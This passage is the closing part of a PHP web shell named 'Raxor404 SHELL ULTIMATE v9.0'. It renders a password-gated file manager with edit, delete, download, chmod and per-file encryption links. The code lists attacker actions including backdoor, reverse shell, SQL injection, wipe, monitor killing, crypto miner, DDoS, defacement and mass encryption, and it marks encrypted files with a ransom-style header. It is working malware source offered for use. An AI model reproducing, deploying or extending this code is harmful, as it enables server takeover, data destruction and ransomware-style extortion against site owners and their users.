    $target = $_REQUEST['target'];
    $name = basename($target);
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="newname" value="'.htmlspecialchars($name).'" required><button type="submit" name="rename" class="btn">✏️ Rename</button></div></form></div>';
}

// ── EDIT FORM ──────────────────────────────────────────────────────
if ($action == 'edit' && isset($_REQUEST['target'])) {
    $target = $_REQUEST['target'];
    if (file_exists($target)) {
        echo '<div class="form-group"><form method="POST"><div class="row"><textarea name="content" style="min-height:200px;">'.htmlspecialchars(@file_get_contents($target)).'</textarea></div><div class="row" style="margin-top:4px;"><button type="submit" name="save" class="btn">💾 Save</button></div></form></div>';
    }
}

// ── VIEW FILE ─────────────────────────────────────────────────────
if ($action == 'view' && isset($_REQUEST['target'])) {
    $target = $_REQUEST['target'];
    if (file_exists($target)) {
        $ext = pathinfo($target, PATHINFO_EXTENSION);
        if (in_array($ext, ['php','txt','html','css','js','json','xml','sql','sh','py','pl','rb','csv','log','ini','conf','yaml','yml','md','markdown'])) {
            echo '<div class="output">'.htmlspecialchars(@file_get_contents($target)).'</div>';
        } else {
            echo '<div class="output">⚠️ Binary file - <a href="?path='.urlencode($real).'&action=dl&target='.urlencode($target).'&pass='.$PASSWORD.'" style="color:#00ff41;">Download</a></div>';
        }
    }
}

// ── OUTPUT ────────────────────────────────────────────────────────
if (isset($showOutput) && $showOutput && isset($output) && $output !== '') {
    echo '<div class="output">'.htmlspecialchars($output).'</div>';
}

// ── FILE LIST ─────────────────────────────────────────────────────
if (!$action || in_array($action, ['', 'mkdir', 'touch', 'upload', 'cmd', 'find', 'grep', 'replace', 'copy', 'move', 'chmod', 'fileinfo', 'encryptall', 'decryptall', 'encryptfile', 'decryptfile', 'zipall', 'unzip', 'sql', 'sqlinject', 'dbbackup', 'mail', 'portscan', 'dnsenum', 'whois', 'grabber', 'reverse', 'wget', 'uploadremote', 'filesearch', 'filereplace', 'info', 'process', 'network', 'firewall', 'phpinfo', 'tree', 'backdoor', 'wipe', 'killmonitor', 'miner', 'ddos', 'deface', 'cryptoreplace', 'rename', 'edit', 'view'])) {
    echo '<div class="table-wrap"><table><thead><tr><th>📁 Name</th><th>📏 Size</th><th>🔐 Perm</th><th style="text-align:right;">⚡ Actions</th></tr></thead><tbody>';
    
    $items = scandir($real);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $full = $real . '/' . $item;
        $isDir = is_dir($full);
        $icon = $isDir ? '📁' : '📄';
        $size = $isDir ? '---' : formatSize(filesize($full));
        $perm = getPerm($full);
        $color = isWritableColor($full);
        
        $isEncrypted = false;
        if (is_file($full)) {
            $content = @file_get_contents($full, false, null, 0, 100);
            if (strpos($content, '-----BEGIN Raxor404 ENCRYPTED-----') !== false) {
                $isEncrypted = true;
                $icon = '🔒';
            }
        }
        
        $link = $isDir ? '?path='.urlencode($full).'&pass='.$PASSWORD : '?path='.urlencode($real).'&action=view&target='.urlencode($full).'&pass='.$PASSWORD;
        
        echo '<tr><td><a href="'.$link.'"><span class="file-icon">'.$icon.'</span>'.htmlspecialchars($item).($isEncrypted ? ' 🔒' : '').'</a></td><td>'.$size.'</td><td style="color:'.$color.'">'.$perm.'</td><td class="actions" style="text-align:right;">';
        
        if ($isDir) {
            echo '<a href="?path='.urlencode($real).'&action=rename&target='.urlencode($full).'&pass='.$PASSWORD.'" title="Rename">✏️</a>';
            echo '<a href="?path='.urlencode($real).'&action=rmdir&target='.urlencode($full).'&pass='.$PASSWORD.'" title="Delete" onclick="return confirm(\'Delete folder?\')">🗑️</a>';
        } else {
            echo '<a href="?path='.urlencode($real).'&action=edit&target='.urlencode($full).'&pass='.$PASSWORD.'" title="Edit">✏️</a>';
            echo '<a href="?path='.urlencode($real).'&action=rename&target='.urlencode($full).'&pass='.$PASSWORD.'" title="Rename">📝</a>';
            echo '<a href="?path='.urlencode($real).'&action=rm&target='.urlencode($full).'&pass='.$PASSWORD.'" title="Delete" onclick="return confirm(\'Delete file?\')">🗑️</a>';
            echo '<a href="?path='.urlencode($real).'&action=dl&target='.urlencode($full).'&pass='.$PASSWORD.'" title="Download">⬇️</a>';
            echo '<a href="?path='.urlencode($real).'&action=chmod&target='.urlencode($full).'&pass='.$PASSWORD.'" title="Chmod">🔐</a>';
            echo '<a href="?action=fileinfo&fileinfo='.urlencode($full).'&pass='.$PASSWORD.'" class="info" title="Info">ℹ️</a>';
            if (!$isEncrypted) {
                echo '<a href="?action=encryptfile&encrypt_file='.urlencode($full).'&pass='.$PASSWORD.'" style="color:#ff0040;" title="Encrypt">🔒</a>';
            } else {
                echo '<a href="?action=decryptfile&decrypt_file='.urlencode($full).'&pass='.$PASSWORD.'" style="color:#ffaa00;" title="Decrypt">🔓</a>';
            }
            echo '<a href="?action=copy&copy='.urlencode($full).'&pass='.$PASSWORD.'" title="Copy">📋</a>';
        }
        
        echo '</td></tr>';
    }
    echo '</tbody></table></div>';
}
?>

<div class="footer">
    <span>⚡ Raxor404 SHELL ULTIMATE v9.0</span> &nbsp;|&nbsp;
    <?= date('Y-m-d H:i:s') ?> &nbsp;|&nbsp;
    <span>BRUTAL MODE</span> &nbsp;|&nbsp;
    <span style="color:#00ff41;">Copyright © SANTIAGO404</span>
</div>